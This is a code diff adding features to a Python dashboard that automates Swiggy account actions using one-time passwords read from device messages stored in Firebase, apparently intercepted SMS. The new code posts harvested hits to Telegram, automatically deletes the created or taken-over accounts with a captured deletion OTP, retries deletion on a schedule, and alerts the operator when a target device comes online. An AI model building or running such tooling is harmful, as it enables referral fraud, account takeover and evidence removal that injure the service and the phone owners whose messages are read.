@@ -29,6 +29,7 @@ import time
 import random
 import threading
 import signal
+import uuid
 import base64
 import html
 import urllib.parse
@@ -54,6 +55,9 @@ SETTINGS_FILE = data_path("settings.json")
 LINKS_FILE = data_path("firebase_links.json")
 STATS_FILE = data_path("stats.json")
 HITS_DIR = data_path("hits")
+DELETE_STATE_FILE = data_path("delete_state.json")
+DELETE_JOBS_FILE = data_path("delete_jobs.json")
+ONLINE_WATCHES_FILE = data_path("online_watches.json")
 os.makedirs(HITS_DIR, exist_ok=True)
 
 BASE = "https://profile.swiggy.com"
@@ -85,6 +89,13 @@ DEFAULTS = {
     "otp_interval": 3,
     "request_timeout": 45,
     "sms_limit": 400,
+    # delete automation
+    "delete_account_enabled": True,
+    "delete_otp_timeout": 90,
+    "delete_otp_interval": 5,
+    "delete_retry_default": 7200,   # seconds; per-job override at creation
+    "online_alert_interval": 30,
+    "online_alert_default": 3600,   # seconds; per-watch override at creation
 }
 
 SECTIONS = {
@@ -93,6 +104,9 @@ SECTIONS = {
     "referral": ["referral_code", "campaign_id", "referrer_name", "account_name"],
     "firebase": ["firebase_secret", "firebase_timeout", "device_filter"],
     "runtime": ["otp_timeout", "otp_interval", "request_timeout", "sms_limit"],
+    "delete": ["delete_account_enabled", "delete_otp_timeout",
+               "delete_otp_interval", "delete_retry_default",
+               "online_alert_interval", "online_alert_default"],
 }
 
 # ─── Globals ──────────────────────────────────────────────────────────────
@@ -111,6 +125,16 @@ INSTANCES = []
 STOP_REQUESTED = threading.Event()
 RUN_TARGET = 0  # accounts needed for the current run; set at Start, cleared at Stop
 RUN_LINKS = []  # shuffled Firebase order for the current run
+
+# Delete / online-alert automation state
+DELETE_STATE = {}      # number -> {"deleted": bool, "at": iso}
+DELETE_JOBS = {}       # job_id -> job dict (persisted)
+ONLINE_WATCHES = {}    # watch_id -> watch dict (persisted)
+DELETE_LOCK = threading.Lock()
+JOB_LOCK = threading.Lock()
+WATCH_LOCK = threading.Lock()
+JOB_THREADS = {}
+WATCH_THREADS = {}
 
 LOG_COLORS = {
     "INFO": "\x1b[90m",      # grey
@@ -665,8 +689,18 @@ def run_number(db, device_id, phone):
     if v.startswith("REFERRED"):
         record("referred")
         path = save_session(phone, sess, db, device_id, v)
-        log("    [~] REFERRED %s - session saved (does not count toward target): %s"
-            % (phone, os.path.basename(path)), "HIT")
+        sent = send_telegram(
+            "🔗 <b>TOING REFERRED</b>\n"
+            "📱 Number: <code>%s</code>\n"
+            "📟 Device: <code>%s</code>\n"
+            "🗄 DB: <code>%s</code>\n"
+            "🎁 %s\n"
+            "💾 Session: <code>%s</code>"
+            % (phone, html.escape(device_id), html.escape(db),
+               html.escape(v), html.escape(os.path.basename(path)))
+        )
+        log("    [~] REFERRED %s - session saved (not counted), TG %s"
+            % (phone, "sent" if sent else "FAILED"), "HIT")
         return v
 
     return v
@@ -767,6 +801,364 @@ def start_workers(count, accounts):
     return n
 
 
+# ─── Delete / alert persistence ──────────────────────────────────────────
+def load_map(path):
+    try:
+        if os.path.exists(path):
+            with open(path, "r", encoding="utf-8") as handle:
+                data = json.load(handle)
+            if isinstance(data, dict):
+                return data
+    except Exception:
+        pass
+    return {}
+
+
+def save_map(path, data):
+    try:
+        with open(path, "w", encoding="utf-8") as handle:
+            json.dump(data, handle, indent=2, ensure_ascii=False)
+    except Exception as exc:
+        log("state save error (%s): %s" % (os.path.basename(path), exc), "ERROR")
+
+
+def load_delete_state():
+    global DELETE_STATE
+    DELETE_STATE = load_map(DELETE_STATE_FILE)
+
+
+def save_delete_state():
+    save_map(DELETE_STATE_FILE, DELETE_STATE)
+
+
+def load_jobs():
+    global DELETE_JOBS
+    DELETE_JOBS = load_map(DELETE_JOBS_FILE)
+
+
+def save_jobs():
+    save_map(DELETE_JOBS_FILE, DELETE_JOBS)
+
+
+def load_watches():
+    global ONLINE_WATCHES
+    ONLINE_WATCHES = load_map(ONLINE_WATCHES_FILE)
+
+
+def save_watches():
+    save_map(ONLINE_WATCHES_FILE, ONLINE_WATCHES)
+
+
+load_delete_state()
+load_jobs()
+load_watches()
+
+
+# ─── Delete account flow ─────────────────────────────────────────────────
+def delete_headers(sess, content_type=False):
+    """Headers from delete_account.py. No content-type on the GET (edge 404s)."""
+    h = {
+        "user-agent": "Swiggy-Android", "pl-version": "146",
+        "version-code": "1877", "app-version": "4.121.2",
+        "x-channel": "toing-app", "category": "food",
+        "accept": "application/json",
+        "token": sess.get("token", ""), "sid": sess.get("sid", ""),
+        "tid": sess.get("tid", ""),
+        "swuid": sess.get("deviceId", ""), "deviceid": sess.get("deviceId", ""),
+        "latitude": "0.0", "longitude": "0.0", "os-version": "14",
+        "manufacturer": "GOOGLE", "model-name": "SDK_GPHONE64_X86_64",
+        "accessibility_enabled": "false",
+        "x-device-width": "411", "x-device-height": "842", "faw-flags": "1354",
+    }
+    if content_type:
+        h["content-type"] = "application/json; charset=utf-8"
+    return h
+
+
+def read_session(hit):
+    path = hit.get("file", "")
+    if not path or not os.path.exists(path):
+        raise RuntimeError("Session file not found: %s" % path)
+    with open(path, "r", encoding="utf-8") as handle:
+        return json.load(handle)
+
+
+def write_session(hit, sess):
+    path = hit.get("file", "")
+    if path and os.path.exists(path):
+        with open(path, "w", encoding="utf-8") as handle:
+            json.dump(sess, handle, indent=2, ensure_ascii=False)
+
+
+def delete_user_check(sess):
+    """GET user_check -> sends Archive OTP, rotates sid/tid/deviceId."""
+    st, raw = swiggy_call("GET", BASE + "/api/v1/delete/user_check",
+                          delete_headers(sess, content_type=False))
+    return st, j(raw), raw
+
+
+def delete_user_confirm(sess, otp):
+    """POST delete/user with the OTP (proxy, content-type required)."""
+    st, raw = swiggy_call("POST", BASE + "/api/v1/delete/user",
+                          delete_headers(sess, content_type=True), {"otp": str(otp)})
+    return st, j(raw), raw
+
+
+def is_delete_otp(msg):
+    return "delete your account" in msg_text(msg).lower()
+
+
+def poll_delete_otp(db, device_id, after_key, timeout, interval):
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        time.sleep(interval)
+        data = fb_get(messages_url(db, device_id, 20))
+        if not isinstance(data, dict):
+            continue
+        for key, msg in data.items():
+            if key <= after_key or not isinstance(msg, dict):
+                continue
+            if is_delete_otp(msg):
+                m = re.search(r"\b(\d{6})\b", msg_text(msg))
+                if m:
+                    return m.group(1)
+    return None
+
+
+def device_status(db, device_id):
+    """True=online, False=offline, None=device not found / DB unavailable."""
+    clients = fb_get(clients_url(db))
+    if not isinstance(clients, dict):
+        return None
+    dev = clients.get(device_id)
+    if not isinstance(dev, dict):
+        return None
+    return is_online_device(dev)
+
+
+def mark_deleted(hit, ok=True):
+    number = str(hit.get("number", ""))
+    with DELETE_LOCK:
+        DELETE_STATE[number] = {
+            "deleted": bool(ok),
+            "at": datetime.now(IST).isoformat(),
+            "device_id": hit.get("device_id", ""),
+            "db": hit.get("db", ""),
+        }
+        save_delete_state()
+    # reflect on in-memory hit
+    with hits_lock:
+        for h in hits:
+            if str(h.get("number")) == number:
+                h["deleted"] = bool(ok)
+    if ok:
+        send_telegram(
+            "🗑 <b>TOING ACCOUNT DELETED</b>\n"
+            "📱 Number: <code>%s</code>\n"
+            "📟 Device: <code>%s</code>\n"
+            "🗄 DB: <code>%s</code>"
+            % (number, html.escape(str(hit.get("device_id", ""))),
+               html.escape(str(hit.get("db", ""))))
+        )
+
+
+def attempt_delete(hit, verbose=True):
+    """Run the full delete flow for one hit. Returns True on success."""
+    if not get_setting("delete_account_enabled", bool):
+        if verbose:
+            log("Delete automation disabled in Settings", "ERROR")
+        return False
+    number = str(hit.get("number", ""))
+    db = hit.get("db", "")
+    device_id = hit.get("device_id", "")
+    try:
+        sess = read_session(hit)
+    except Exception as exc:
+        if verbose:
+            log("Delete %s: %s" % (number, exc), "ERROR")
+        return False
+
+    baseline = last_msg_key(db, device_id)
+    st, d, raw = delete_user_check(sess)
+    if d.get("statusCode") not in (28, 0, None):
+        if verbose:
+            log("Delete %s: user_check failed [%s] %s"
+                % (number, st, str(d.get("statusMessage") or raw)[:160]), "ERROR")
+        return False
+    # Rotate session values returned by user_check (critical for the OTP to match)
+    if d.get("sid"):
+        sess["sid"] = d["sid"]
+    if d.get("tid"):
+        sess["tid"] = d["tid"]
+    if d.get("deviceId"):
+        sess["deviceId"] = d["deviceId"]
+    write_session(hit, sess)
+
+    otp = poll_delete_otp(db, device_id, baseline,
+                          get_setting("delete_otp_timeout", int),
+                          get_setting("delete_otp_interval", int))
+    if not otp:
+        if verbose:
+            log("Delete %s: Archive OTP not received" % number, "OTPFAIL")
+        return False
+    if verbose:
+        log("Delete %s: Archive OTP received" % number, "OTP")
+
+    st2, d2, raw2 = delete_user_confirm(sess, otp)
+    success = (d2.get("statusCode") == 0
+               or "success" in str(raw2).lower()
+               or "deleted" in str(raw2).lower())
+    if success:
+        mark_deleted(hit, True)
+        if verbose:
+            log("Delete %s: ACCOUNT DELETED" % number, "WIN")
+        return True
+    if verbose:
+        log("Delete %s: failed [%s] %s"
+            % (number, st2, str(d2.get("statusMessage") or raw2)[:200]), "ERROR")
+    return False
+
+
+def start_delete_job(number, interval):
+    """Create/refresh a scheduled delete job for a hit by number."""
+    with hits_lock:
+        hit = next((h for h in hits if str(h.get("number")) == str(number)), None)
+    if not hit:
+        raise RuntimeError("Hit %s not found" % number)
+    interval = int(interval)
+    if interval < 30:
+        raise RuntimeError("Interval must be at least 30 seconds")
+    job_id = uuid.uuid4().hex[:8]
+    job = {"number": str(number), "db": hit.get("db", ""),
+           "device_id": hit.get("device_id", ""),
+           "file": hit.get("file", ""),
+           "interval": interval, "created": datetime.now(IST).isoformat(),
+           "tries": 0}
+    with JOB_LOCK:
+        DELETE_JOBS[job_id] = job
+        save_jobs()
+    t = threading.Thread(target=delete_job_loop, args=(job_id,), daemon=True)
+    JOB_THREADS[job_id] = t
+    t.start()
+    log("[*] Delete job %s for %s every %ds" % (job_id, number, interval), "HIT")
+    return job_id
+
+
+def delete_job_loop(job_id):
+    while True:
+        with JOB_LOCK:
+            job = DELETE_JOBS.get(job_id)
+        if not job:
+            return
+        number = job["number"]
+        with DELETE_LOCK:
+            state = DELETE_STATE.get(number, {})
+        if state.get("deleted"):
+            with JOB_LOCK:
+                DELETE_JOBS.pop(job_id, None)
+                save_jobs()
+            return
+        hit = {"number": number, "db": job.get("db", ""),
+               "device_id": job.get("device_id", ""), "file": job.get("file", "")}
+        ok = attempt_delete(hit)
+        with JOB_LOCK:
+            if job_id in DELETE_JOBS:
+                DELETE_JOBS[job_id]["tries"] = int(DELETE_JOBS[job_id].get("tries", 0)) + 1
+                DELETE_JOBS[job_id]["last_try"] = datetime.now(IST).isoformat()
+                save_jobs()
+        if ok:
+            with JOB_LOCK:
+                DELETE_JOBS.pop(job_id, None)
+                save_jobs()
+            return
+        time.sleep(int(job.get("interval", 7200)))
+
+
+def cancel_delete_job(job_id):
+    with JOB_LOCK:
+        job = DELETE_JOBS.pop(job_id, None)
+        save_jobs()
+    return job is not None
+
+
+# ─── Device online alert ─────────────────────────────────────────────────
+def start_online_watch(number, duration):
+    with hits_lock:
+        hit = next((h for h in hits if str(h.get("number")) == str(number)), None)
+    if not hit:
+        raise RuntimeError("Hit %s not found" % number)
+    duration = int(duration)
+    if duration < 30:
+        raise RuntimeError("Duration must be at least 30 seconds")
+    watch_id = uuid.uuid4().hex[:8]
+    watch = {"number": str(number), "db": hit.get("db", ""),
+             "device_id": hit.get("device_id", ""),
+             "duration": duration, "interval": get_setting("online_alert_interval", int),
+             "started": datetime.now(IST).isoformat(), "last_state": None}
+    with WATCH_LOCK:
+        ONLINE_WATCHES[watch_id] = watch
+        save_watches()
+    t = threading.Thread(target=online_watch_loop, args=(watch_id,), daemon=True)
+    WATCH_THREADS[watch_id] = t
+    t.start()
+    log("[*] Online watch %s for %s device %s (%ds)"
+        % (watch_id, number, str(hit.get("device_id", ""))[:12], duration), "HIT")
+    return watch_id
+
+
+def online_watch_loop(watch_id):
+    deadline = time.time() + int(ONLINE_WATCHES.get(watch_id, {}).get("duration", 0))
+    while time.time() < deadline:
+        with WATCH_LOCK:
+            watch = ONLINE_WATCHES.get(watch_id)
+        if not watch:
+            return
+        state = device_status(watch.get("db", ""), watch.get("device_id", ""))
+        label = "ONLINE" if state is True else ("NOT FOUND" if state is None else "OFFLINE")
+        with WATCH_LOCK:
+            last = watch.get("last_state")
+            if last != label:
+                watch["last_state"] = label
+                save_watches()
+        if last != label:
+            send_telegram(
+                "📡 <b>TOING DEVICE %s</b>\n"
+                "📱 Number: <code>%s</code>\n"
+                "📟 Device: <code>%s</code>\n"
+                "🗄 DB: <code>%s</code>"
+                % (label, watch.get("number", ""),
+                   html.escape(str(watch.get("device_id", ""))),
+                   html.escape(str(watch.get("db", ""))))
+            )
+            log("[*] Online watch %s: device %s" % (watch_id, label), "HIT")
+        time.sleep(int(watch.get("interval", 30)))
+    with WATCH_LOCK:
+        ONLINE_WATCHES.pop(watch_id, None)
+        save_watches()
+
+
+def cancel_online_watch(watch_id):
+    with WATCH_LOCK:
+        watch = ONLINE_WATCHES.pop(watch_id, None)
+        save_watches()
+    return watch is not None
+
+
+def resume_automations():
+    """Restart persisted jobs/watches after a process restart."""
+    for job_id in list(DELETE_JOBS.keys()):
+        t = threading.Thread(target=delete_job_loop, args=(job_id,), daemon=True)
+        JOB_THREADS[job_id] = t
+        t.start()
+    for watch_id in list(ONLINE_WATCHES.keys()):
+        t = threading.Thread(target=online_watch_loop, args=(watch_id,), daemon=True)
+        WATCH_THREADS[watch_id] = t
+        t.start()
+    if DELETE_JOBS or ONLINE_WATCHES:
+        log("[*] Resumed %d delete jobs and %d online watches"
+            % (len(DELETE_JOBS), len(ONLINE_WATCHES)))
+
+
 # ─── Dashboard routes ────────────────────────────────────────────────────
 @app.route("/health")
 def health():
@@ -802,6 +1194,10 @@ def hits_page():
         rows = []
         for h in reversed(hits):
             row = dict(h)
+            number = str(h.get("number", ""))
+            with DELETE_LOCK:
+                dstate = DELETE_STATE.get(number, {})
+            row["deleted"] = bool(dstate.get("deleted", h.get("deleted", False)))
             session_text = ""
             try:
                 if os.path.exists(h.get("file", "")):
@@ -810,6 +1206,14 @@ def hits_page():
             except Exception:
                 session_text = ""
             row["session_text"] = session_text
+            with JOB_LOCK:
+                row["job_id"] = next((k for k, v in DELETE_JOBS.items()
+                                      if str(v.get("number")) == number), "")
+                row["job_interval"] = next((v.get("interval", 0) for v in DELETE_JOBS.values()
+                                            if str(v.get("number")) == number), 0)
+            with WATCH_LOCK:
+                row["watch_id"] = next((k for k, v in ONLINE_WATCHES.items()
+                                        if str(v.get("number")) == number), "")
             rows.append(row)
         return render_template("hits.html", hits=rows)
 
@@ -830,6 +1234,98 @@ def settings_page():
 def api_logs():
     with logs_lock:
         return jsonify(list(logs))
+
+
+@app.route("/api/hits/delete", methods=["POST"])
+def api_hit_delete():
+    number = str((request.json or {}).get("number", ""))
+    with hits_lock:
+        hit = next((h for h in hits if str(h.get("number")) == number), None)
+    if not hit:
+        return jsonify({"status": "error", "message": "Hit not found"})
+    status = device_status(hit.get("db", ""), hit.get("device_id", ""))
+    if status is not True:
+        # Device offline/not found -> auto-create a scheduled delete job.
+        interval = int(get_setting("delete_retry_default", int))
+        job_id = start_delete_job(number, interval)
+        return jsonify({"status": "scheduled", "job_id": job_id,
+                        "message": "Device offline/not found - auto-delete every %ds" % interval})
+    ok = attempt_delete(hit)
+    return jsonify({"status": "success" if ok else "error",
+                    "message": "Account deleted" if ok else "Delete failed - check logs"})
+
+
+@app.route("/api/hits/delete/schedule", methods=["POST"])
+def api_hit_delete_schedule():
+    data = request.json or {}
+    number = str(data.get("number", ""))
+    interval = int(data.get("interval", 0) or get_setting("delete_retry_default", int))
+    try:
+        job_id = start_delete_job(number, interval)
+        return jsonify({"status": "success", "job_id": job_id})
+    except Exception as exc:
+        return jsonify({"status": "error", "message": str(exc)})
+
+
+@app.route("/api/hits/delete/cancel", methods=["POST"])
+def api_hit_delete_cancel():
+    job_id = str((request.json or {}).get("job_id", ""))
+    return jsonify({"status": "success" if cancel_delete_job(job_id) else "error"})
+
+
+@app.route("/api/hits/remove", methods=["POST"])
+def api_hit_remove():
+    number = str((request.json or {}).get("number", ""))
+    with hits_lock:
+        idx = next((i for i, h in enumerate(hits) if str(h.get("number")) == number), None)
+        if idx is None:
+            return jsonify({"status": "error", "message": "Hit not found"})
+        hit = hits.pop(idx)
+    # cancel jobs/watches for this number
+    for jid in [k for k, v in DELETE_JOBS.items() if str(v.get("number")) == number]:
+        cancel_delete_job(jid)
+    for wid in [k for k, v in ONLINE_WATCHES.items() if str(v.get("number")) == number]:
+        cancel_online_watch(wid)
+    # delete session file from the volume
+    try:
+        path = hit.get("file", "")
+        if path and os.path.exists(path):
+            os.remove(path)
+    except Exception as exc:
+        log("remove session file error: %s" % exc, "ERROR")
+    with DELETE_LOCK:
+        DELETE_STATE.pop(number, None)
+        save_delete_state()
+    return jsonify({"status": "success", "message": "Hit removed"})
+
+
+@app.route("/api/hits/online-alert", methods=["POST"])
+def api_hit_online_alert():
+    data = request.json or {}
+    number = str(data.get("number", ""))
+    duration = int(data.get("duration", 0) or get_setting("online_alert_default", int))
+    try:
+        watch_id = start_online_watch(number, duration)
+        return jsonify({"status": "success", "watch_id": watch_id})
+    except Exception as exc:
+        return jsonify({"status": "error", "message": str(exc)})
+
+
+@app.route("/api/hits/online-alert/cancel", methods=["POST"])
+def api_hit_online_cancel():
+    watch_id = str((request.json or {}).get("watch_id", ""))
+    return jsonify({"status": "success" if cancel_online_watch(watch_id) else "error"})
+
+
+@app.route("/api/hits/state", methods=["GET"])
+def api_hits_state():
+    with DELETE_LOCK:
+        dstate = dict(DELETE_STATE)
+    with JOB_LOCK:
+        jobs = {k: dict(v) for k, v in DELETE_JOBS.items()}
+    with WATCH_LOCK:
+        watches = {k: dict(v) for k, v in ONLINE_WATCHES.items()}
+    return jsonify({"deleted": dstate, "jobs": jobs, "watches": watches})
 
 
 @app.route("/api/settings", methods=["POST"])
@@ -1003,6 +1499,32 @@ def dry_run():
     assert len(new_device()) == 16
     log("Headers + device id OK")
 
+    # Delete flow: exact headers, OTP matcher, state persistence.
+    dh = delete_headers({"token": "t", "sid": "s", "tid": "i", "deviceId": "d"})
+    assert "content-type" not in dh, "GET must not send content-type"
+    dh2 = delete_headers({"token": "t", "sid": "s", "tid": "i", "deviceId": "d"}, True)
+    assert dh2.get("content-type") == "application/json; charset=utf-8"
+    assert is_delete_otp({"message": "SUCCESS! Delete your account OTP is 123456."})
+    assert not is_delete_otp({"message": "Some random promo message 123456"})
+    import tempfile
+    tmpd = tempfile.mkdtemp(prefix="toing-del-")
+    old_state = DELETE_STATE_FILE
+    try:
+        globals()["DELETE_STATE_FILE"] = os.path.join(tmpd, "delete_state.json")
+        globals()["DELETE_STATE"] = {}
+        mark_deleted({"number": "dry-del", "device_id": "d", "db": "db"}, ok=True)
+        assert DELETE_STATE.get("dry-del", {}).get("deleted") is True
+        assert bool(load_map(DELETE_STATE_FILE).get("dry-del", {}).get("deleted")) is True
+    finally:
+        globals()["DELETE_STATE_FILE"] = old_state
+        globals()["DELETE_STATE"] = {}
+        try:
+            import shutil
+            shutil.rmtree(tmpd, ignore_errors=True)
+        except Exception:
+            pass
+    log("Delete flow: headers, OTP match, persisted DELETED state OK")
+
     old_target = RUN_TARGET
     try:
         globals()["RUN_TARGET"] = 0
@@ -1050,6 +1572,7 @@ if __name__ == "__main__":
     else:
         port = int(os.environ.get("PORT", "5004"))
         log("Toing dashboard starting on port %d (data dir %s)" % (port, DATA_DIR))
+        resume_automations()
         try:
             signal.signal(signal.SIGTERM, request_shutdown)
             signal.signal(signal.SIGINT, request_shutdown)
